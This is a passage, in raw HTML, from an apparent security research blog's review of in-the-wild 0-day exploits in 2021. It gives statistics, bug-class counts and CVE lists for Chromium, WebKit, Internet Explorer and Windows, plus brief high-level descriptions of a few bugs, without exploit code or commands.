 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRS0t_2Bwvc3U_EIr5h7NcWpQyjzHCPb4OMiDpzPxPs587otAEj8bzwch8UMFlgKchwdSq4L_PXRn1O6KGLHUl4X9voLBdZJNQsgQyJcMCVB4Y8-aRHaXRpOYZw7KVtyNYwdWpwX8ILUV1fyG2kDsXVWORsSPUBGVTON90gWf9POhhxA4edxNe1eoV/s1200/image2%285%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRS0t_2Bwvc3U_EIr5h7NcWpQyjzHCPb4OMiDpzPxPs587otAEj8bzwch8UMFlgKchwdSq4L_PXRn1O6KGLHUl4X9voLBdZJNQsgQyJcMCVB4Y8-aRHaXRpOYZw7KVtyNYwdWpwX8ILUV1fyG2kDsXVWORsSPUBGVTON90gWf9POhhxA4edxNe1eoV/s1200/image2%285%29.png" border="0" alt="a line graph showing how many in-the-wild 0-days were found by their own vendor per year from 2015 to 2021. 2015: 0, 2016: 0, 2017: 2, 2018: 0, 2019: 4, 2020: 5, 2021: 17. Data comes from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600px;"title="a line graph showing how many in-the-wild 0-days were found by their own vendor per year from 2015 to 2021. 2015: 0, 2016: 0, 2017: 2, 2018: 0, 2019: 4, 2020: 5, 2021: 17. Data comes from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /></a></span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>We&rsquo;ve also seen the number of vendors detecting in-the-wild 0-days in their own products increasing.</span><span>&nbsp;Whether or not these vendors were previously working on detection, vendors seem to have found ways to be more successful in 2021. Vendors likely have the most telemetry and overall knowledge and visibility into their products so it&rsquo;s important that they are investing in (and hopefully having success in) detecting 0-days targeting their own products. As shown in the </span><span>chart above</span><span class="HNYIspzEBn-c0">, there was a significant increase in the number of in-the-wild 0-days discovered by vendors in their own products. Google discovered 7 of the in-the-wild 0-days in their own products and Microsoft discovered 10 in their products!</span></p><h2 class="HNYIspzEBn-c7" id="h.bkkzvkf2rtnk"><span class="HNYIspzEBn-c12">More disclosure</span></h2>
 <p class="HNYIspzEBn-c5"><span>The second reason why the number of detected in-the-wild 0-days has increased is due to more disclosure of these vulnerabilities. Apple and Google Android </span><span>(we </span><span>differentiate</span><span>&nbsp;&ldquo;Google Android&rdquo; rather than just &ldquo;Google&rdquo; because Google Chrome has been annotating their security bulletins for the last few years)</span><span class="HNYIspzEBn-c0">&nbsp;first began labeling vulnerabilities in their security advisories with the information about potential in-the-wild exploitation in November 2020 and January 2021 respectively. When vendors don&rsquo;t annotate their release notes, the only way we know that a 0-day was exploited in-the-wild is if the researcher who discovered the exploitation comes forward. If Apple and Google Android had not begun annotating their release notes, the public would likely not know about at least 7 of the Apple in-the-wild 0-days and 5 of the Android in-the-wild 0-days. Why? Because these vulnerabilities were reported by &ldquo;Anonymous&rdquo; reporters. If the reporters didn&rsquo;t want credit for the vulnerability, it&rsquo;s unlikely that they would have gone public to say that there were indications of exploitation. That is 12 0-days that wouldn&rsquo;t have been included in this year&rsquo;s list if Apple and Google Android had not begun transparently annotating their security advisories. </span></p>
 <p class="HNYIspzEBn-c5"></p>

 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPe_J-0Wu9Ap-0n3Yj5BoXiWTnjViyyGasIChhb3juADZosK9nTbyiaWtzuRyjwG3frQNjLsvRMRoQHrFfo1iKa3GjmcuLHqat40GcoechQ16XbhpVGwF7m_TJ0Oucvy3wvm8x0aXbVnJfhkG2FNkxI4cJf5ONBqEYnPxQDUmZChvByLHE8OzSU20N/s1200/image3%287%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPe_J-0Wu9Ap-0n3Yj5BoXiWTnjViyyGasIChhb3juADZosK9nTbyiaWtzuRyjwG3frQNjLsvRMRoQHrFfo1iKa3GjmcuLHqat40GcoechQ16XbhpVGwF7m_TJ0Oucvy3wvm8x0aXbVnJfhkG2FNkxI4cJf5ONBqEYnPxQDUmZChvByLHE8OzSU20N/s1200/image3%287%29.png" border="0" alt="bar graph that shows the number of Android and Apple (WebKit + iOS + macOS) in-the-wild 0-days per year. The bar graph is split into two color: yellow for Anonymously reported 0-days and green for non-anonymous reported 0-days. 2021 is the only year with any anonymously reported 0-days. 2015: 0, 2016: 3, 2018: 2, 2019: 1, 2020: 3, 2021: Non-Anonymous: 8, Anonymous- 12. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600px;" title="bar graph that shows the number of Android and Apple (WebKit + iOS + macOS) in-the-wild 0-days per year. The bar graph is split into two color: yellow for Anonymously reported 0-days and green for non-anonymous reported 0-days. 2021 is the only year with any anonymously reported 0-days. 2015: 0, 2016: 3, 2018: 2, 2019: 1, 2020: 3, 2021: Non-Anonymous: 8, Anonymous- 12. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /></a></span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>Kudos and thank you to Microsoft, Google Chrome, and Adobe who have been annotating their security bulletins for transparency for multiple years now! And thanks to Apache who also annotated their release notes for </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://httpd.apache.org/security/vulnerabilities_24.html">CVE-2021-41773</a></span><span class="HNYIspzEBn-c0">&nbsp;this past year. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">In-the-wild 0-days in Qualcomm and ARM products were annotated as in-the-wild in Android security bulletins, but not in the vendor&rsquo;s own security advisories.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>It&#39;s highly likely that in 2021, there were other 0-days that were exploited in the wild and detected, but vendors did not mention this in their release notes. In 2022, we hope that more vendors start noting when they patch vulnerabilities that have been exploited in-the-wild. Until we&rsquo;re confident that all vendors are transparently disclosing in-the-wild status, there&rsquo;s a big question of how many in-the-wild 0-days are discovered, but not labeled publicly by vendors.</span></p><h1 class="HNYIspzEBn-c11" id="h.s04j4o5mq8tl"><span>New Year, Old Techniques</span></h1>
 <p class="HNYIspzEBn-c5"><span>We had a record number of &ldquo;data points&rdquo; in 2021 to understand how attackers are actually using 0-day exploits. A bit surprising to us though, out of all those data points, there was nothing new amongst all this data. 0-day exploits are considered one of the most </span><span>advanced</span><span>&nbsp;attack methods an actor can use, so it would be easy to conclude that attackers must be using special tricks and attack surfaces. But instead, the 0-days we saw in 2021 generally followed the same bug patterns, attack surfaces, and exploit &ldquo;shapes&rdquo; previously seen in public research. Once &ldquo;0-day is hard&rdquo;, we&rsquo;d expect that to be successful, attackers would have to find new bug classes of vulnerabilities in new attack surfaces using never before seen exploitation methods. </span><span>In general, </span><span>that wasn&#39;t what the</span><span>&nbsp;data showed us this year. With two exceptions (described below in the iOS section) out of the 58, everything we saw was pretty &ldquo;</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://www.dictionary.com/browse/meh#:~:text=unimpressive%3B%20boring%3A">meh</a></span><span>&rdquo; or standard.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">Out of the 58 in-the-wild 0-days for the year, 39, or 67% were memory corruption vulnerabilities. Memory corruption vulnerabilities have been the standard for attacking software for the last few decades and it&rsquo;s still how attackers are having success. Out of these memory corruption vulnerabilities, the majority also stuck with very popular and well-known bug classes:</span></p><ul style="padding: 0;" class="c6 lst-kix_bfmkl5o48mun-0 start"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">17 use-after-free</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">6 out-of-bounds read &amp; write</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">4 buffer overflow</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">4 integer overflow</span></li></ul>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>In the next sections we&rsquo;ll dive into each major platform that we saw in-the-wild 0-days for this year. We&rsquo;ll share the trends and explain why what we saw was pretty unexceptional.</span></p><h2 class="HNYIspzEBn-c7" id="h.421487jv8qwq"><span class="HNYIspzEBn-c12">Chromium (Chrome)</span></h2>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">Chromium had a record high number of 0-days detected and disclosed in 2021 with 14. Out of these 14, 10 were renderer remote code execution bugs, 2 were sandbox escapes, 1 was an infoleak, and 1 was used to open a webpage in Android apps other than Google Chrome.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">The 14 0-day vulnerabilities were in the following components:</span></p><ul style="padding: 0;" class="c6 lst-kix_1mxsacho6zj1-0 start"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>6 JavaScript Engine - v8 (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/02/stable-channel-update-for-desktop_4.html">CVE-2021-21148</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/02/stable-channel-update-for-desktop_4.html">CVE-2021-30551</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/07/stable-channel-update-for-desktop.html">CVE-2021-30563</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html">CVE-2021-30632</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-37975.html">CVE-2021-37975</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/10/stable-channel-update-for-desktop_28.html">CVE-2021-38003</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>2 DOM Engine - Blink (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/03/stable-channel-update-for-desktop_12.html">CVE-2021-21193</a></span><span>&nbsp;&amp; </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/04/stable-channel-update-for-desktop.html">CVE-2021-21206</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 WebGL (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/06/stable-channel-update-for-desktop_17.html">CVE-2021-30554</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 IndexedDB (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop.html">CVE-2021-30633</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 webaudio (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-21166.html">CVE-2021-21166</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 Portals (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop_24.html">CVE-2021-37973</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 Android Intents (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-38000.html">CVE-2021-38000</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 Core (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://chromereleases.googleblog.com/2021/09/stable-channel-update-for-desktop_30.html">CVE-2021-37976</a></span><span class="HNYIspzEBn-c0">)</span></li></ul>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">When we look at the components targeted by these bugs, they&rsquo;re all attack surfaces seen before in public security research and previous exploits. If anything, there are a few less DOM bugs and more targeting these other components of browsers like IndexedDB and WebGL than previously. 13 out of the 14 Chromium 0-days were memory corruption bugs. Similar to last year, most of those memory corruption bugs are use-after-free vulnerabilities.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>A couple of the Chromium bugs were even similar to previous in-the-wild 0-days. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-21166.html">CVE-2021-21166</a></span><span>&nbsp;is an issue in </span><span class="HNYIspzEBn-c10">ScriptProcessorNode::Process()</span><span>&nbsp;in webaudio where there&rsquo;s insufficient locks such that buffers are accessible in both the main thread and the audio rendering thread at the same time. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-13720.html">CVE-2019-13720</a></span><span>&nbsp;is an in-the-wild 0-day from 2019. It was a vulnerability in </span><span class="HNYIspzEBn-c10">ConvolverHandler::Process()</span><span class="HNYIspzEBn-c0">&nbsp;in webaudio where there were also insufficient locks such that a buffer was accessible in both the main thread and the audio rendering thread at the same time.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html">CVE-2021-30632</a></span><span>&nbsp;is another Chromium in-the-wild 0-day from 2021. It&rsquo;s a type confusion in the &nbsp;TurboFan JIT in Chromium&rsquo;s JavaScript Engine, v8, where Turbofan fails to deoptimize code after a</span><span>&nbsp;property map is changed</span><span>. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30632.html">CVE-2021-30632</a></span><span>&nbsp;in particular deals with code that stores global properties. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-16009.html">CVE-2020-16009</a></span><span class="HNYIspzEBn-c0">&nbsp;was also an in-the-wild 0-day that was due to Turbofan failing to deoptimize code after map deprecation.</span></p><h2 class="HNYIspzEBn-c7" id="h.q5lkhzsdchwk"><span class="HNYIspzEBn-c12">WebKit (Safari)</span></h2>
 <p class="HNYIspzEBn-c5"><span>Prior to 2021, Apple had only acknowledged </span><span>1 publicly known in-the-wild 0-day targeting WebKit/Safari, and that was due </span><span>the sharing by an external researcher. In 2021 there were 7. This makes it hard for us to assess trends or changes since we don&rsquo;t have historical samples to go off of. Instead, we&rsquo;ll look at 2021&rsquo;s WebKit bugs in the context of other Safari bugs not known to be in-the-wild and other browser in-the-wild 0-days. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">The 7 in-the-wild 0-days targeted the following components:</span></p><ul style="padding: 0;" class="c6 lst-kix_knibgsincpme-0 start"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>4 Javascript Engine - JavaScript Core (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212146">CVE-2021-1870</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212146">CVE-2021-1871</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212336">CVE-2021-30663</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212336">CVE-2021-30665</a></span><span class="HNYIspzEBn-c0">)</span></li></ul><ul style="padding: 0;" class="c6 lst-kix_grz5i5wr9ig-0 start"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 IndexedDB (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30858.html">CVE-2021-30858</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 Storage (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212317">CVE-2021-30661</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 Plugi</span><span>n</span><span>s (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1879.html">CVE-2021-1879</a></span><span class="HNYIspzEBn-c0">)</span></li></ul>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">The one semi-surprise is that no DOM bugs were detected and disclosed. In previous years, vulnerabilities in the DOM engine have generally made up 15-20% of the in-the-wild browser 0-days, but none were detected and disclosed for WebKit in 2021. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>It would not be surprising if attackers are beginning to shift to other modules, like third party libraries or things like IndexedDB. The modules may be more promising to attackers going forward because there&rsquo;s a better chance that the vulnerability may exist in multiple browsers or platforms</span><span>.</span><span>&nbsp;For example, the webaudio bug in Chromium, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-21166.html">CVE-2021-21166</a></span><span>, also existed in WebKit and was fixed as </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212223">CVE-2021-1844</a></span><span>, though there was no evidence it was exploited in-the-wild in WebKit. The IndexedDB in-the-wild 0-day that was used against Safari in 2021, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30858.html">CVE-2021-30858</a></span><span>, was very, very similar to a </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1032890">bug fixed in Chromium in January 2020</a></span><span>.</span></p><h2 class="HNYIspzEBn-c7" id="h.pypmw8ahj82o"><span class="HNYIspzEBn-c12">Internet Explorer</span></h2>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">Since we began tracking in-the-wild 0-days, Internet Explorer has had a pretty consistent number of 0-days each year. 2021 actually tied 2016 for the most in-the-wild Internet Explorer 0-days we&rsquo;ve ever tracked even though Internet Explorer&rsquo;s market share of web browser users continues to decrease.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"></p>

 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbMTlnGhVLcVL8K20S3s6hSrpyB6kZAA9CWvWNpn1isbEbLFv0c2rs_dPvM0ALT45NtTvyhp8rGehGDRIAEJ6OZYSkk5mezOEoPJOquVXXyHeqrVOvRGEiQHv_J7Je8Itjc5qhwXMCR-E4y79abuxiddCYoeF2VrVakY-L1q82NeMEPjTA0fFC-t8h/s1200/image4%286%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbMTlnGhVLcVL8K20S3s6hSrpyB6kZAA9CWvWNpn1isbEbLFv0c2rs_dPvM0ALT45NtTvyhp8rGehGDRIAEJ6OZYSkk5mezOEoPJOquVXXyHeqrVOvRGEiQHv_J7Je8Itjc5qhwXMCR-E4y79abuxiddCYoeF2VrVakY-L1q82NeMEPjTA0fFC-t8h/s1200/image4%286%29.png" border="0" alt="Bar graph showing the number of Internet Explorer itw 0-days discovered per year from 2015-2021. 2015: 3, 2016: 4, 2017: 3, 2018: 1, 2019: 3, 2020: 2, 2021: 4. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600px;"title="Bar graph showing the number of Internet Explorer itw 0-days discovered per year from 2015-2021. 2015: 3, 2016: 4, 2017: 3, 2018: 1, 2019: 3, 2020: 2, 2021: 4. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /></a></span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">So why are we seeing so little change in the number of in-the-wild 0-days despite the change in market share? Internet Explorer is still a ripe attack surface for initial entry into Windows machines, even if the user doesn&rsquo;t use Internet Explorer as their Internet browser. While the number of 0-days stayed pretty consistent to what we&rsquo;ve seen in previous years, the components targeted and the delivery methods of the exploits changed. 3 of the 4 0-days seen in 2021 targeted the MSHTML browser engine and were delivered via methods other than the web. Instead they were delivered to targets via Office documents or other file formats. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">The four 0-days targeted the following components:</span></p><ul style="padding: 0;" class="c6 lst-kix_bqyk3pvm93qj-0 start"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>MSHTML browser engine (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26411.html">CVE-2021-26411</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-33742.html">CVE-2021-33742</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444">CVE-2021-40444</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>Javascript Engine - JScript9 (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34448">CVE-2021-34448</a></span><span>)</span></li></ul>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>For </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26411.html">CVE-2021-26411</a></span><span>&nbsp;t</span><span>argets of the campaign initially received a </span><span class="HNYIspzEBn-c10">.mht</span><span>&nbsp;file, which prompted the user to open in Internet Explorer. Once it was opened in Internet Explorer, the exploit was downloaded and run. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-33742.html">CVE-2021-33742</a></span><span>&nbsp;and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444">CVE-2021-40444</a></span><span class="HNYIspzEBn-c0">&nbsp;were delivered to targets via malicious Office documents.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26411.html">CVE-2021-26411</a></span><span>&nbsp;and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-33742.html">CVE-2021-33742</a></span><span>&nbsp;were two common memory corruption bug patterns: a use-after-free due to a user controlled callback in between two actions using an object and the user frees the object during that callback and a buffer overflow.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>There were a few different vulnerabilities used in the exploit chain that used </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444">CVE-2021-40444</a></span><span>, but the one within MSHTML was that as soon as the Office document was opened the payload would run: a CAB file was downloaded, decompressed, and then a function from within a DLL in that CAB was executed. Unlike the previous two MSHTML bugs, this was a logic error in URL parsing rather than a memory corruption bug.</span></p><h2 class="HNYIspzEBn-c7" id="h.i2yh4xx4r7n0"><span class="HNYIspzEBn-c12">Windows</span></h2>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">Windows is the platform where we&rsquo;ve seen the most change in components targeted compared with previous years. However, this shift has generally been in progress for a few years and predicted with the end-of-life of Windows 7 in 2020 and thus why it&rsquo;s still not especially novel.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">In 2021 there were 10 Windows in-the-wild 0-days targeting 7 different components:</span></p><ul style="padding: 0;" class="c6 lst-kix_rvy0q9fw47sg-0 start"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>2 Enhanced crypto provider (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31199">CVE-2021-31199</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31201">CVE-2021-31201</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>2 NTOS kernel (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33771">CVE-2021-33771</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31979">CVE-2021-31979</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>2 Win32k (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html">CVE-2021-1732</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/">CVE-2021-40449</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 Windows update medic (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36948">CVE-2021-36948</a></span><span class="HNYIspzEBn-c0">) </span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 SuperFetch (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31955">CVE-2021-31955</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 dwmcore.dll (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28310">CVE-2021-28310</a></span><span class="HNYIspzEBn-c0">)</span></li></ul><ul style="padding: 0;" class="c6 lst-kix_718o7hzyu4f-0 start"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>1 ntfs.sys (</span><span 